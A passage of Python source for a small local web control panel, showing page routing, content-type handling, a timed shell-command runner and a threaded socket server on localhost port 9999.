        if page == "/requests":
            if pGet=={}:
                self.pages["/requests"] = self.html_requests()
            else:
                self.save_cfg(pGet)
                self.pages["/requests"] = self.html_request_submit()
        if page == "/abduction":
            self.pages["/abduction"] = self.html_abduction()
        if page == "/stats":
            self.pages["/stats"] = self.html_stats()
        if page == "/wormhole":
            self.pages["/wormhole"] = self.pages["/header"] + "<iframe height='100%' width='100%' src='https://webchat.freenode.net'>"
        ctype = "text/html"
        if page.find(".js") != -1:
            ctype = "application/javascript"
        elif page.find(".txt") != -1:
            ctype = "text/plain"
        elif page.find(".ico") != -1:
            ctype = "image/x-icon"
        elif page.find(".png") != -1:
            ctype = "image/png"
        elif page.find(".css") != -1:
            ctype = "text/css"
        if page in self.pages:
            return dict(run=runcmd, code="200 OK", html=self.pages[page], ctype=ctype)
        return dict(run=runcmd, code="404 Error", html="404 Error<br><br>Page not found...", ctype=ctype)

class Command(object):
    def __init__(self, cmd):
        self.cmd = cmd
        self.process = None

    def run(self, timeout):
        def target():
            self.process = subprocess.Popen(self.cmd, shell=True)
        thread = threading.Thread(target=target)
        thread.start()
        thread.join(timeout)
        if thread.is_alive():
            self.process.terminate()
            thread.join()

if __name__ == "__main__":
    webbrowser.open('http://127.0.0.1:9999', new=1)
    tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcpsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    tcpsock.bind((host, port))
    while True:
        tcpsock.listen(4)
        (clientsock, (ip, c_port)) = tcpsock.accept()
        newthread = ClientThread(ip, c_port, clientsock)
        newthread.start()
